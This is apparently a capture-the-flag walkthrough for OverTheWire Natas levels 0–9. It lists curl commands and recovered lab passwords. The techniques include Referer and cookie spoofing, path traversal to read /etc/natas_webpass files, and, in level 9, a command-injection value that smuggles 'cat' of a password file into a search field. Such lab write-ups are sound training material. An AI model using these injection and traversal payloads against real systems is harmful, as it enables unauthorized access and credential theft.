# Natas

## level 0

```
$ curl -u natas0:natas0 http://natas0.natas.labs.overthewire.org/
```

```
<!--The password for natas1 is gtVrDuiDfck831PqWsLEZy5gyDz1clto -->
```

## level 1

```
$ curl -u natas1:gtVrDuiDfck831PqWsLEZy5gyDz1clto http://natas1.natas.labs.overthewire.org/
```

```
<!--The password for natas2 is ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi -->
```

## level 2

```
$ curl -u natas2:ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi http://natas2.natas.labs.overthewire.org/
```

I find a label.

```
<img src="files/pixel.png">
```

There is a ```users.txt``` in the same directory and password for natas3 is in it.

```
$ curl -u natas2:ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi http://natas2.natas.labs.overthewire.org/files/users.txt
```

```
natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14
```

## level 3

```
$ curl -u natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14 http://natas3.natas.labs.overthewire.org/
```

```
<!-- No more information leaks!! Not even Google will find it this time... -->
```

Check the ```robots.txt```.

```
$ curl -u natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14 http://natas3.natas.labs.overthewire.org/robots.txt
User-agent: *
Disallow: /s3cr3t/
```

There is also a ```user.txt``` with password for the next level.

```
$ curl -u natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14 http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt
natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ
```

## level 4

This level determines whether we come from ```http://natas5.natas.labs.overthewire.org/``` by ```Referer``` header field.

```
$ curl -u natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ http://natas4.natas.labs.overthewire.org/ -H 'Referer:http://natas5.natas.labs.overthewire.org/'
```

```
Access granted. The password for natas5 is iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq
```

## level 5

```
$ curl -u natas5:iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq http://natas5.natas.labs.overthewire.org/ -v
```

Find ```Set-Cookie: loggedin=0```.

```
$ curl -u natas5:iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq http://natas5.natas.labs.overthewire.org/ -b 'loggedin=1'
```

```
Access granted. The password for natas6 is aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1
```

## level 6

Access ```http://natas6.natas.labs.overthewire.org/index-source.html``` and find ```include "includes/secret.inc";```.

```
$ curl -u natas6:aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1 http://natas6.natas.labs.overthewire.org/includes/secret.inc
$secret = "FOEIUWGHFEEUHOFUOIU";
```

```
$ curl -u natas6:aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1 http://natas6.natas.labs.overthewire.org/ -d 'secret=FOEIUWGHFEEUHOFUOIU&submit=Submit'
```

```
Access granted. The password for natas7 is 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9
```

## level 7

```
$ curl -u natas7:7z3hEENjQtflzgnT29q7wAvMNfZdh0i9 'http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8'
```

```
DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe
```

## level 8

```php
<?php
// http://natas8.natas.labs.overthewire.org/index-source.html
$encodedSecret = "3d3d516343746d4d6d6c315669563362";

function encodeSecret($secret) {
    return bin2hex(strrev(base64_encode($secret)));
}

if(array_key_exists("submit", $_POST)) {
    if(encodeSecret($_POST['secret']) == $encodedSecret) {
    print "Access granted. The password for natas9 is <censored>";
    } else {
    print "Wrong secret";
    }
}
?>
```

Decode the ```secret```.

```
$ echo 3d3d516343746d4d6d6c315669563362 | xxd -p -r | rev | base64 -d
oubWYf2kBq
```

```
$ curl -u natas8:DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe http://natas8.natas.labs.overthewire.org/ -d 'secret=oubWYf2kBq&submit=Submit'
```

```
Access granted. The password for natas9 is W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl
```

## level 9

```php
<?php
// http://natas9.natas.labs.overthewire.org/index-source.html
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
?>
```

```
$ curl -u natas9:W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl http://natas9.natas.labs.overthewire.org/ -F 'needle=;cat /etc/natas_webpass/natas10 #' -F 'submit=Search'
```

```
nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu
```
